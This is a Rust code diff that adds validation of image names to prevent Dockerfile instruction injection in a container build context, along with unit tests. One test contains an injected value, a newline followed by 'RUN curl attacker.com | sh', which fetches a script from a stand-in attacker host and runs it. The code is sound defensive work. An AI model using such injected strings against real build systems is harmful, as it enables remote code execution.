@@ -5,8 +5,25 @@
 
 use crate::features::dockerfile::generate_all_feature_layers;
 use crate::features::resolve::ResolvedFeature;
-use crate::Result;
+use crate::{CoreError, Result};
 use std::path::{Path, PathBuf};
+
+/// Validate that an image name is safe to embed in a Dockerfile FROM instruction.
+///
+/// Rejects empty names and names containing control characters (newlines, etc.)
+/// which could inject arbitrary Dockerfile instructions.
+fn validate_image_name(name: &str) -> Result<()> {
+    if name.is_empty() {
+        return Err(CoreError::InvalidState("Image name cannot be empty".into()));
+    }
+    if name.chars().any(|c| c.is_control()) {
+        return Err(CoreError::InvalidState(format!(
+            "Image name contains invalid characters: {:?}",
+            name
+        )));
+    }
+    Ok(())
+}
 
 /// Dropbear and socat installation script that detects the package manager
 /// socat is needed to bridge pipes to sockets for SSH over stdio
@@ -49,6 +66,7 @@ impl EnhancedBuildContext {
     /// 1. FROM <base_image>
     /// 2. Installs dropbear
     pub fn from_image(base_image: &str) -> Result<Self> {
+        validate_image_name(base_image)?;
         let temp_dir = tempfile::tempdir()?;
         let dockerfile_path = temp_dir.path().join("Dockerfile");
 
@@ -122,6 +140,7 @@ impl EnhancedBuildContext {
         inject_ssh: bool,
         remote_user: &str,
     ) -> Result<Self> {
+        validate_image_name(base_image)?;
         let temp_dir = tempfile::tempdir()?;
         let dockerfile_path = temp_dir.path().join("Dockerfile");
 
@@ -270,6 +289,44 @@ fn copy_features_to_context(features: &[ResolvedFeature], context_dir: &Path) ->
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    // ==================== validate_image_name tests ====================
+
+    #[test]
+    fn test_validate_image_name_valid() {
+        assert!(validate_image_name("ubuntu:22.04").is_ok());
+        assert!(validate_image_name("ghcr.io/org/image:latest").is_ok());
+        assert!(validate_image_name("localhost:5000/img").is_ok());
+        assert!(validate_image_name("mcr.microsoft.com/devcontainers/base:ubuntu").is_ok());
+    }
+
+    #[test]
+    fn test_validate_image_name_rejects_newline() {
+        let result = validate_image_name("ubuntu:22.04\nRUN curl attacker.com | sh");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_validate_image_name_rejects_empty() {
+        assert!(validate_image_name("").is_err());
+    }
+
+    #[test]
+    fn test_from_image_rejects_malicious_name() {
+        let result = EnhancedBuildContext::from_image("bad\nRUN evil");
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_from_image_with_features_rejects_malicious_name() {
+        let result = EnhancedBuildContext::from_image_with_features(
+            "bad\rimage",
+            &[],
+            false,
+            "root",
+        );
+        assert!(result.is_err());
+    }
 
     // ==================== copy_dir_recursive tests ====================
 
